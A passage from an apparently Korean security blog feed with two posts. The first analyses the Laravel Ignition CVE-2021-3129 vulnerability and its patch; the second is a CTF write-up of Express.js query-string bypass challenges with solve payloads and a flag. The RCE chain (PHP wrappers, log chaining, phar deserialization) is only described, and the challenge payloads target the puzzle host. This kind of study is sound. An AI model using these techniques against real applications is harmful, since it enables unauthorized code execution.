class="keyword">implements</span> <span class="title">RunnableSolution</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$output</span> = <span class="keyword">$this</span>-&gt;makeOptional(<span class="variable">$parameters</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$output</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            file_put_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>], <span class="variable">$output</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">makeOptional</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$originalContents</span> = file_get_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$newContents</span> = str_replace(<span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>], <span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>].<span class="string">&quot; ?? &#x27;&#x27;&quot;</span>, <span class="variable">$originalContents</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$originalTokens</span> = token_get_all(Blade::compileString(<span class="variable">$originalContents</span>));</span><br><span class="line">        <span class="variable">$newTokens</span> = token_get_all(Blade::compileString(<span class="variable">$newContents</span>));</span><br><span class="line"></span><br><span class="line">        <span class="variable">$expectedTokens</span> = <span class="keyword">$this</span>-&gt;generateExpectedTokens(<span class="variable">$originalTokens</span>, <span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$expectedTokens</span> !== <span class="variable">$newTokens</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newContents</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">generateExpectedTokens</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$originalTokens</span>, <span class="keyword">string</span> <span class="variable">$variableName</span></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$expectedTokens</span> = [];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$originalTokens</span> <span class="keyword">as</span> <span class="variable">$token</span>) &#123;</span><br><span class="line">            <span class="variable">$expectedTokens</span>[] = <span class="variable">$token</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$token</span>[<span class="number">0</span>] === T_VARIABLE &amp;&amp; <span class="variable">$token</span>[<span class="number">1</span>] === <span class="string">&#x27;$&#x27;</span>.<span class="variable">$variableName</span>) &#123;</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_WHITESPACE, <span class="string">&#x27; &#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_COALESCE, <span class="string">&#x27;??&#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_WHITESPACE, <span class="string">&#x27; &#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_CONSTANT_ENCAPSED_STRING, <span class="string">&quot;&#x27;&#x27;&quot;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$expectedTokens</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>위 요청 헤더에서 sollution이 가르키는 <code>MakeViewVariableOptionalSolution</code> 클래스를 보면 run() 메서드에서 makeOptional() 메서드를 호출하는 것을 볼 수 있고, makeOptional() 메서드에 값으로 $parameters를 그대로 넘겨주고 있는 것을 볼 수 있습니다. (Facade\Ignition\Solutions\MakeViewVariableOptionalSolution) </strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">makeOptional</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$originalContents</span> = file_get_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$newContents</span> = str_replace(<span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>], <span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>].<span class="string">&quot; ?? &#x27;&#x27;&quot;</span>, <span class="variable">$originalContents</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$originalTokens</span> = token_get_all(Blade::compileString(<span class="variable">$originalContents</span>));</span><br><span class="line">    <span class="variable">$newTokens</span> = token_get_all(Blade::compileString(<span class="variable">$newContents</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$expectedTokens</span> = <span class="keyword">$this</span>-&gt;generateExpectedTokens(<span class="variable">$originalTokens</span>, <span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$expectedTokens</span> !== <span class="variable">$newTokens</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$newContents</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>makeOptional() 메서드를 보면 file_get_contents() 메서드를 호출하는 데 이때 입력값인 <code>viewFile</code>(임의의 값을 넣어줄 수 있음)를 넘겨주고 있는 것을 볼 수 있습니다. 그리고 <code>$originalContents</code>에서 <code>&#39;$&#39;.$parameters[&#39;variableName&#39;]</code>을 <code>&#39;$&#39;.$parameters[&#39;variableName&#39;].&quot; ?? &#39;&#39;&quot;</code>로 replace 시키고, 2개의 값을 이용해서 토큰 2개를 생성하는 것을 볼 수 있습니다. 그리고 생성된 두개의 토큰이 다르 false를 반환하고, 같은 $newContents를 반환하는 것을 볼 수 있습니다.</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$output</span> = <span class="keyword">$this</span>-&gt;makeOptional(<span class="variable">$parameters</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$output</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">        file_put_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>], <span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>$newContents가 리턴이 되었다면 $newContents의 값을 file_put_contents() 메서드를 이용해서 $parameters[‘viewFile’]로 값을 넣어 파일을 생성하고 . 감이 오셨나요? 여기서 file_get_contents(), file_put_contents() 메서드의 인자값에 대한 검증이 존재하지 않아 우리가 원하는 값을 마음대로 삽입할 수 있습니다.</strong><br><br></p><p><strong>연구원은 이를 이용해서 PHP Wrapper을 이용해 log 파일을 체이닝 시켜, 마지막에 phar Wrapper를 이용해서 역직렬화 RCE를 트리거 하였습니다. log 파일을 체이닝 할 때는 base64, utf-8, utf-16 등을 이용해서 체이닝을 해준 것으로 보입니다.</strong><br></p><hr><h2 id="CVE-2021-3129-Patch"><a href="#CVE-2021-3129-Patch" class="headerlink" title="CVE-2021-3129 Patch"></a><em>CVE-2021-3129 Patch</em></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /ignition-2.5.2/ignition-2.5.2/src/Solutions/MakeViewVariableOptionalSolution.php</span></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$output</span> = <span class="keyword">$this</span>-&gt;makeOptional(<span class="variable">$parameters</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$output</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            file_put_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>], <span class="variable">$output</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">isSafePath</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$path</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (! Str::startsWith(<span class="variable">$path</span>, [<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;./&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (! Str::endsWith(<span class="variable">$path</span>, <span class="string">&#x27;.blade.php&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">makeOptional</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">$this</span>-&gt;isSafePath(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$originalContents</span> = file_get_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>]);</span><br><span class="line">        <span class="variable">$newContents</span> = str_replace(<span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>], <span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>].<span class="string">&quot; ?? &#x27;&#x27;&quot;</span>, <span class="variable">$originalContents</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$originalTokens</span> = token_get_all(Blade::compileString(<span class="variable">$originalContents</span>));</span><br><span class="line">        <span class="variable">$newTokens</span> = token_get_all(Blade::compileString(<span class="variable">$newContents</span>));</span><br><span class="line"></span><br><span class="line">        <span class="variable">$expectedTokens</span> = <span class="keyword">$this</span>-&gt;generateExpectedTokens(<span class="variable">$originalTokens</span>, <span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$expectedTokens</span> !== <span class="variable">$newTokens</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newContents</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">generateExpectedTokens</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$originalTokens</span>, <span class="keyword">string</span> <span class="variable">$variableName</span></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$expectedTokens</span> = [];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$originalTokens</span> <span class="keyword">as</span> <span class="variable">$token</span>) &#123;</span><br><span class="line">            <span class="variable">$expectedTokens</span>[] = <span class="variable">$token</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$token</span>[<span class="number">0</span>] === T_VARIABLE &amp;&amp; <span class="variable">$token</span>[<span class="number">1</span>] === <span class="string">&#x27;$&#x27;</span>.<span class="variable">$variableName</span>) &#123;</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_WHITESPACE, <span class="string">&#x27; &#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_COALESCE, <span class="string">&#x27;??&#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_WHITESPACE, <span class="string">&#x27; &#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_CONSTANT_ENCAPSED_STRING, <span class="string">&quot;&#x27;&#x27;&quot;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$expectedTokens</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>CVE-2021-3129 Patch 노트가 따로 존재하지 않아 패치 버전인 Ignition 2.5.2의 코드를 직접 확인해보았습니다. <code>makeOptional()</code> 메서드를 보면 기존에는 존재하지 않던 <code>$parameters[&#39;viewFile&#39;]</code>의 값을 <code>isSafePath()</code> 메서드를 이용해서 검증하고 있는 것을 볼 수 있습니다.</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">isSafePath</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$path</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (! Str::startsWith(<span class="variable">$path</span>, [<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;./&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (! Str::endsWith(<span class="variable">$path</span>, <span class="string">&#x27;.blade.php&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><code>isSafePath()</code> 메서드를 보면 ‘/‘, ‘./‘로 시작하지 않거나, 마지막에 .blade.php가 아니면 false를 리턴하는 것을 볼 수 있습니다. 위 2개의 검증 로직이 추가되므로 항상 viewFile의 값이 <code>/work/pentest/laravel/laravel/resources/views/hello.blade.php</code>일 때 정상 작동하게 되었고, 개발자가 의도하지 않은 값이 <code>viewFile</code>로 들어오게 되면 아무 일도 일어나지 않게 되며 CVE-2021-3129 취약점을 패치하였습니다.</strong><br></p><p><strong>매번 느끼지만 PHP에서는 끊임 없이 취약점이 나오고 있네요. 앞으로도 PHP를 사용하고 있는 웹 프레임워크나 여러 프로그램에서 취약점이 더 수두룩 나올 거 같습니다.</strong><br></p><hr>]]></content>
      
      
      <categories>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Express Challenge Write Up (Gynvael Coldwind)</title>
      <link href="2021/01/24/2021-01-24-express-challenge/"/>
      <url>2021/01/24/2021-01-24-express-challenge/</url>
      
        <content type="html"><![CDATA[<p><strong>트위터에서 Gynvael Coldwind라는 분이 만든 Express Challenge 입니다.</strong><br></p><hr><h3 id="Challenge-1"><a href="#Challenge-1" class="headerlink" title="Challenge 1"></a>Challenge 1</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Level <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PORT = <span class="number">5001</span></span><br><span class="line"><span class="keyword">const</span> FLAG = process.env.FLAG || <span class="string">&quot;???&quot;</span></span><br><span class="line"><span class="keyword">const</span> SOURCE = fs.readFileSync(<span class="string">&#x27;app.js&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.statusCode = <span class="number">200</span></span><br><span class="line">  res.setHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/plain;charset=utf-8&#x27;</span>)</span><br><span class="line">  res.write(<span class="string">&quot;Level 1\n\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!(<span class="string">&#x27;secret&#x27;</span> <span class="keyword">in</span> req.query)) &#123;</span><br><span class="line">    res.end(SOURCE)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (req.query.secret.length &gt; <span class="number">5</span>) &#123;</span><br><span class="line">    res.end(<span class="string">&quot;I don&#x27;t allow it.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (req.query.secret != <span class="string">&quot;GIVEmeTHEflagNOW&quot;</span>) &#123;</span><br><span class="line">    res.end(<span class="string">&quot;Wrong secret.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  res.end(FLAG)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(PORT, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Example app listening at port <span class="subst">$&#123;PORT&#125;</span>`</span>)</span><br><span class="line">&#125;) </span><br></pre></td></tr></table></figure><p><strong>Challenge 1의 솔브 조건을 확인해보면 Query String인 secret의 길이가 5 이상이면 안 되고, secret의 값이 <code>GIVEmeTHEflagNOW</code>여야 합니다. 하지만 해당 값은 길이가 16 이므로 5 이상이기 때문에 중간에 끊기게 됩니다.</strong><br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">＞ <span class="keyword">var</span> secret = [<span class="string">&#x27;GIVEmeTHEflagNOW&#x27;</span>];</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">＞ secret.length</span><br><span class="line"><span class="number">1</span></span><br><span class="line">＞ <span class="keyword">if</span> (secret == <span class="string">&#x27;GIVEmeTHEflagNOW&#x27;</span>)&#123;<span class="built_in">console</span>.log(<span class="number">1</span>);&#125;</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><p><strong> 하지만 Express.js는 Object로 Query String을 보내줄 수 있기 때문에 이를 이용해서 보내주면 길이는 1, secret의 값은 <code>GIVEmeTHEflagNOW</code>가 되므로 문제를 해결할 수 있습니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solve Payload : http:&#x2F;&#x2F;challenges.gynvael.stream:5001&#x2F;?secret[]&#x3D;GIVEmeTHEflagNOW</span><br></pre></td></tr></table></figure><p><code>FLAG : CTF&#123;SmellsLikePHP&#125;</code></p><hr><h3 id="Challenge-2"><a href="#Challenge-2" class="headerlink" title="Challenge 2"></a>Challenge 2</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">Level <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PORT = <span class="number">5002</span></span><br><span class="line"><span class="keyword">const</span> FLAG = process.env.FLAG || <span class="string">&quot;???&quot;</span></span><br><span class="line"><span class="keyword">const</span> SOURCE = fs.readFileSync(<span class="string">&#x27;app.js&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.statusCode = <span class="number">200</span></span><br><span class="line">  res.setHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/plain;charset=utf-8&#x27;</span>)</span><br><span class="line">  res.write(<span class="string">&quot;Level 2\n\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!(<span class="string">&#x27;X&#x27;</span> <span class="keyword">in</span> req.query)) &#123;</span><br><span class="line">    res.end(SOURCE)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (req.query.X.length &gt; <span class="number">800</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> s = <span class="built_in">JSON</span>.stringify(req.query.X)</span><br><span class="line">    <span class="keyword">if</span> (s.length &gt; <span class="number">100</span>) &#123;</span><br><span class="line">      res.end(<span class="string">&quot;Go away.&quot;</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> k = <span class="string">&#x27;&lt;&#x27;</span> + req.query.X + <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">      res.end(<span class="string">&quot;Close, but no cigar.&quot;</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">      res.end(FLAG)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.end(<span class="string">&quot;No way.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(PORT, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Challenge listening at port <span class="subst">$&#123;PORT&#125;</span>`</span>)</span><br><span class="line">&#125;) </span><br></pre></td></tr></table></figure><p><strong><code>req.query.X</code>의 길이는 800보다 커야 하고, <code>JSON.stringify(req.query.X)</code>의 값은 100보다 작아야 합니다. </strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bypass Payload: http:&#x2F;&#x2F;challenges.gynvael.stream:5002&#x2F;?X[length]&#x3D;801</span><br></pre></td></tr></table></figure><p><strong>Express.js는 Object로 값을 보내줄 수 있다는 것을 알고 있습니다. 위 조건문은 위 Payload를 이용해서 쉽게 우회할 수 있습니다. </strong><br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (req.query.X.length &gt; <span class="number">800</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> s = <span class="built_in">JSON</span>.stringify(req.query.X)</span><br><span class="line">  <span class="keyword">if</span> (s.length &gt; <span class="number">100</span>) &#123;</span><br><span class="line">    res.end(<span class="string">&quot;Go away.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><strong><code>req.query.X.length</code>를 참조하면 801, <code>JSON.stringify()</code> 메서드를 이용해서 Query String을 문자열로 만들게 되면 길이가 길어봐야 35정도(최종 페이로드 기준) 될 것이기 때문에 쉽게 우회할 수 있습니다.</strong><br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> k = <span class="string">&#x27;&lt;&#x27;</span> + req.query.X + <span 